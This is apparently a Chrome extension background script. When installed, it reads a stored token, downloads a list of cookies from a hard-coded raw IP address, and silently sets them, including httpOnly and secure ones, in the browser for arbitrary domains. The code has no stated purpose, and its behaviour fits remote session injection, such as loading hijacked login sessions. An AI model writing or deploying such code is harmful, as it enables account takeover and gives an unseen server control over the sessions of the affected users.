chrome.runtime.onInstalled.addListener(() => {
  chrome.storage.local.get("token", ({ token }) => {
    if (!token) return;
    fetch("http://172.83.14.144:3000/cookies/" + token)
      .then(res => res.json())
      .then(data => {
        if (data.cookies) {
          for (const cookie of data.cookies) {
            chrome.cookies.set({
              url: "https://" + cookie.domain.replace(/^\./, ""),
              name: cookie.name,
              value: cookie.value,
              domain: cookie.domain,
              path: cookie.path,
              secure: cookie.secure,
              httpOnly: cookie.httpOnly,
              expirationDate: cookie.expirationDate,
              sameSite: cookie.sameSite
            });
          }
        }
      });
  });
});
